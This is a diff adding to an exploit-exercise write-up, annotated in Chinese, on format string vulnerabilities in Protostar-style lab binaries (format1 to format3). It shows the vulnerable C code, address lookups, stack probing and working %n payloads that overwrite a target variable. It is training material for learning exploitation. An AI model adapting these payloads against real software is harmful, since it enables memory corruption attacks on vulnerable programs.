@@ -248,3 +248,130 @@ int main(int argc, char **argv)
 $ ./format1 "$(python -c "print 'A' * 4 + '\x38\x96\x04\x08' + 'B' * 7 + '%x' * 135 + '%n'")"
 AAAA8BBBBBBB804960cbffff5d88048469b7fd8304b7fd7ff4bffff5d88048435bffff7bcb7ff1040804845bb7fd7ff480484500bffff658b7eadc762bffff684bffff690b7fe1848bffff640ffffffffb7ffeff4804824d1bffff640b7ff0626b7fffab0b7fe1b28b7fd7ff400bffff658e8c9752abb7f65000280483400b7ff6210b7eadb9bb7ffeff42804834008048361804841c2bffff68480484508048440b7ff1040bffff67cb7fff8f82bffff7b2bffff7bc0bffff8dcbffff8f1bffff908bffff920bffff92ebffff942bffff963bffff97abffff98dbffff997bffffe87bffffea0bffffedebffffef2bfffff10bfffff27bfffff38bfffff53bfffff5bbfffff6bbfffff78bfffffacbfffffc0bfffffd4bfffffe6020b7fe241421b7fe200010178bfbbf61000116438048034420577b7fe30008098048340b3e9c0d3e9e3e917119bffff79b1fbffffff2fbffff7ab00120000008433fc8b69057f81755be21d6923a08e3638362f2e00006d726f6631746141414141you have modified the target :)
 ```
+
+## Format 2
+
+> how specific values can be written in memory
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int target;
+
+void vuln()
+{
+  char buffer[512];
+
+  fgets(buffer, sizeof(buffer), stdin); // char *fgets(char *s, int size, FILE *stream);
+  printf(buffer);
+  
+  if(target == 64) {
+      printf("you have modified the target :)\n");
+  } else {
+      printf("target is %d :(\n", target);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln();
+}
+```
+
+- 变量 `target` 对应的地址
+
+    ```bash
+    $ objdump -t format2 | grep target
+    080496e4 g     O .bss	00000004              target
+    ```
+
+- 观察输入字符串在栈中的位置
+
+    ```bash
+    $ python -c "print('%x ' * 20)" | ./format2
+    200 b7fd8420 bffff514 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 b7ff000a 0 
+    target is 0 :(
+    ```
+
+- 通过 `%x` 从栈中取参数直到读到目标 `080496e4`，设需要 `%x`（占 $2$ 个字节） 的数量为 $x$，$2x/4 + 3 = x$ 解得 $x=6$
+    - 在 `%n` 前需打印 $64$ 个字符，通过 `%x` 共计打印 $6 \times 8 - 5 = 43$ 个字符，加上 `\xe4\x96\x04\x08`，还需再补充 $17$ 个字符
+- 当然，可以简单地通过 `$` 来决定取第几个参数
+
+### Exploit
+
+```bash
+$ python -c "print('%x' * 6 + '\xe4\x96\x04\x08' + 'A' * 17 + '%n')" | ./format2
+200b7fd8420bffff514782578257825782578257825AAAAAAAAAAAAAAAAA
+you have modified the target :)
+# Simple Version
+$ python -c "print('\xe4\x96\x04\x08' + 'A' * 60 + '%4\$n')" | ./format2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+you have modified the target :)
+```
+
+## Format 3
+
+> how to write more than 1 or 2 bytes of memory to the process
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int target;
+
+void printbuffer(char *string)
+{
+  printf(string);
+}
+
+void vuln()
+{
+  char buffer[512];
+
+  fgets(buffer, sizeof(buffer), stdin);
+
+  printbuffer(buffer);
+  
+  if(target == 0x01025544) {
+      printf("you have modified the target :)\n");
+  } else {
+      printf("target is %08x :(\n", target);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln();
+}
+```
+
+- 变量 `target` 对应的地址
+
+    ```bash
+    $ objdump -t format3 | grep target
+    080496f4 g     O .bss	00000004              target
+    ```
+
+- 观察输入字符串在栈中的位置
+
+    ```bash
+    $ python -c "print('%x ' * 20)" | ./format3
+    0 bffff4d0 b7fd7ff4 0 0 bffff6d8 804849d bffff4d0 200 b7fd8420 bffff514 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 
+    target is 00000000 :(
+    ```
+
+- `target` 的目标值为 `0x01025544`，而输入限制长度为 `512` 字符，可以通过设置输出最小宽度来补足字符
+
+### Exploit
+
+```bash
+$ python -c "print('\xf4\x96\x04\x08' + '%16930112x' + '%12\$n')" | ./format3
+...
+                                0
+you have modified the target :)
+```
